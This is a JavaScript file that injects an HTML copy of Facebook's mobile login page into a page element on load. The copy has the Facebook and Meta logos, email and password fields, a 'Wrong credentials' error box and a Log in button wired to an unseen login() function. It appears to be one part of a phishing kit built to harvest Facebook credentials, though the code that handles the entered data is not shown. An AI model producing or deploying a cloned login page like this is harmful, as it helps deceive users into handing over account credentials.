function generateFacebookLoginPage() {
  const fbContent = `
        <div id="fb_wrapper">
            <!-- Your HTML content goes here -->
            <div id="fbbody" class="fbook">
                <br>
                <center><span style="display: flex; justify-content: center; align-items: center; text-align: center; color: rgb(70, 90, 105); display: inline; font-size: 13px; font-family: 'Optimistic Text Normal';">English (UK)</span></center><br><br><br><br>
                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
                    style="pointer-events: none; margin-top: 0px; margin-bottom: 20px; flex-grow: 1; flex-shrink: 100; align-items: center; justify-content: center;">
                    <img alt="Facebook from Meta" src="/img/fblogo.png" class="wbloks_1"
                        style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
                </div><br><br><br>
                <div class="pam _3-95 _9ay3 uiBoxRed" role="alert" tabindex="0" id="error_box" style="display: none;">
                    <div class="fsl fwb fcb" style="font-weight: 700; font-size: 14px;">Wrong credentials</div>
                    <div>Invalid username or password</div>
                </div><br>
                <div class="form-group">
                    <input type="text" id="fb-email" required oninput="toggleClearIcon()">
                    <label for="fb-email">Mobile number or email address</label>
                    <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
                </div>
                <div class="form-group">
                    <input type="password" id="fb-pass" required>
                    <label for="fb-pass">Password</label>
                    <div class="toggle-password" onclick="togglePasswordVisibility()"></div>
                </div>
                <div style="opacity: 1; height: 44px; min-width: 44px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgb(0, 100, 224); border: 0px solid rgb(28, 43, 51); border-radius: 22px; align-items: center; flex-direction: row; justify-content: center;">
                    <div class="wbloks_113" dir="auto">
                        <div onclick="login()" style="padding: 9px; display: flex; justify-content: center; color: rgb(255, 255, 255); font-weight: 500;  font-size: 16px; font-family: 'Optimistic Text Normal';">Log in</div>
                    </div>
                </div> <br><br>
                <div class="wbloks_112" style="font-size: 15px; max-height: 20.28px; word-break: break-all;">
                    <div class="wbloks_113" dir="auto"><span data-bloks-name="bk.components.TextSpan"
                            style="line-height: 1rem; color: rgb(28, 43, 51); font-weight: 500; display: inline; font-size: 15px; font-family: 'Optimistic Text Normal'; overflow-wrap: break-word;">Forgotten
                            Password?</span></div>
                </div><br><br><br><br><br>
                <div data-bloks-name="bk.components.Flexbox" tabindex="0" role="button" aria-label="Create new account"
                    data-anchor-id="replay" class="wbloks_1" style="pointer-events: inherit; width: 100%;">
                    <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
                        style="pointer-events: none; opacity: 1; height: 36px; min-width: 36px; flex-grow: 1; padding-left: 20px; padding-right: 20px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(203, 210, 217); border-radius: 18px; align-items: center; flex-direction: row; justify-content: center;">
                        <div>
                            <span data-bloks-name="bk.components.TextSpan"
                                style="padding: 8px; display: flex; justify-content: center; color: rgb(28, 43, 51); font-weight: 500; display: flex; font-size: 15px; font-family: 'Optimistic Text Normal'; overflow-wrap: break-word;">Create new account</span>
                        </div>
                    </div>
                </div>
                <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
                    style="pointer-events: none; flex-grow: 1; flex-shrink: 1e+06; padding-bottom: 0px; flex-direction: column; justify-content: flex-end;">
                    <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
                        style="pointer-events: none; padding-top: 20px; padding-bottom: 20px; align-items: center; justify-content: center;">
                        <center>
                            <div class="wbloks_1" style="height: 12px; aspect-ratio: 5 / 1;">
                                <div data-bloks-name="bk.components.AspectRatio" class="wbloks_108"
                                    style="aspect-ratio: 5 / 1;">
                                    <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" height="1" width="5"
                                        class="wbloks_110"></svg>
                                </div>
                                <div class="wbloks_109"><img alt="Meta logo" src="/img/meta.png" class="wbloks_1"
                                        style="width: 100%; pointer-events: inherit; mask-image: url(/img/meta.png); mask-size: contain; background-color: rgb(70, 90, 105); object-position: 10000px 10000px; object-fit: contain; overflow: hidden;">
                                </div>
                        </center>
                    </div>
                </div><br>
                <div data-bloks-name="bk.components.Flexbox"
                    style="font-family: 'Optimistic Text Normal'; word-spacing: 10px; pointer-events: none; align-items: center; flex-direction: column; justify-content: center;">
                    <div data-bloks-name="bk.components.Flexbox" class="wbloks_1" style="pointer-events: none;">
                        <div data-bloks-name="bk.components.Flexbox" class="wbloks_1"
                            style="pointer-events: none; padding-left: 4px; padding-right: 4px; padding-bottom: 4px;">
                            <span data-bloks-name="bk.components.TextSpan"
                                style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">About</span>
                            <span data-bloks-name="bk.components.TextSpan"
                                style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">Help</span>
                            <span data-bloks-name="bk.components.TextSpan"
                                style="pointer-events: auto; cursor: pointer; color: rgb(99, 120, 138); display: inline; font-size: 10px; white-space: pre-wrap; overflow-wrap: break-word;">More</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    `;

  // Insert the generated HTML into the target element
  document.getElementById("fbLogcontent").innerHTML = fbContent;
}

// Call the function to generate and display the HTML when the page loads
window.onload = generateFacebookLoginPage;
